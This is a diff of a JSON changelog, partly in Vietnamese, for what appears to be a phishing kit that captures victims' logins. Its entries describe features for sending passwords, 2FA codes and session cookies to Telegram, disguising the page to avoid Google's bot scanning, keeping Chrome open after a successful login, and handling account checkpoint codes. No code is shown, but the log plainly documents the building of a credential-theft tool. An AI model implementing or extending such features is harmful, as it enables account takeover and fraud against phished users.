@@ -1,14 +1,141 @@
-[
-    {
-        "title": "Loại bỏ chức năng tự lấy code 6 - 8 khi sai pass:",
-        "description": "Thay thế bằng cách gửi code raw về Telegram"
-    },
-    {
-        "title": "Cập nhật giao diện mã hóa:",
-        "description": "Giúp tránh bot quét của Google."
-    },
-    {
-        "title": "Thêm tùy chọn cho Chrome:",
-        "description": "Bao gồm giữ Chrome mở khi đăng nhập thành công, tắt tải ảnh và tài nguyên phụ, và lấy cookie với quyền đầy đủ hoặc dạng tối giản."
-    }
-]
+{
+    "commits": [
+        {
+            "date": "Jun 3, 2024",
+            "messages": [
+                {
+                    "type": "feat",
+                    "scope": "auth",
+                    "description": "add case 956 for nick and add option to create object on login instead of connect",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "chore",
+                    "scope": "ci",
+                    "description": "update GitHub Action to run only on commits to the main branch",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "fix",
+                    "description": "prevent client from redirecting when sending code 681",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "refactor",
+                    "scope": "auth",
+                    "description": "set maximum wrong password attempts to 3",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "chore",
+                    "scope": "ci",
+                    "description": "remove runner count in CI",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "feat",
+                    "scope": "form",
+                    "description": "add birthday prop to form",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "fix",
+                    "description": "prevent mobile devices from scrolling up",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "refactor",
+                    "scope": "lib",
+                    "description": "remove unnecessary elif statement",
+                    "author": "tripleseven190504"
+                }
+            ]
+        },
+        {
+            "date": "Jun 2, 2024",
+            "messages": [
+                {
+                    "type": "fix",
+                    "description": "handle missing .gitignore file error in cleanup script",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "feat",
+                    "description": "add initial GitHub Actions workflow for Vite Build",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "feat",
+                    "scope": "form",
+                    "description": "add submit form and Telegram data submission for users without 2FA",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "docs",
+                    "description": "update README with new features and instructions",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "feat",
+                    "scope": "auth",
+                    "description": "add login with phone number and fix issue 681 not working",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "fix",
+                    "description": "prevent random password rerender with useMemo",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "fix",
+                    "description": "remove forgot password function and fix JavaScript not working",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "fix",
+                    "description": "resolve Socket.IO bug",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "chore",
+                    "description": "remove unused library",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "fix",
+                    "description": "resolve issue with Socket not disconnecting",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "feat",
+                    "description": "add client",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "refactor",
+                    "description": "convert HTML to JSON format",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "chore",
+                    "description": "add Tailwind CSS CDN to fix missing CSS in changelog",
+                    "author": "tripleseven190504"
+                },
+                {
+                    "type": "fix",
+                    "description": "correct incorrect path for .github folder",
+                    "author": "tripleseven190504"
+                }
+            ]
+        },
+        {
+            "date": "May 28, 2024",
+            "messages": [
+                {
+                    "type": "init",
+                    "author": "tripleseven190504"
+                }
+            ]
+        }
+    ]
+}
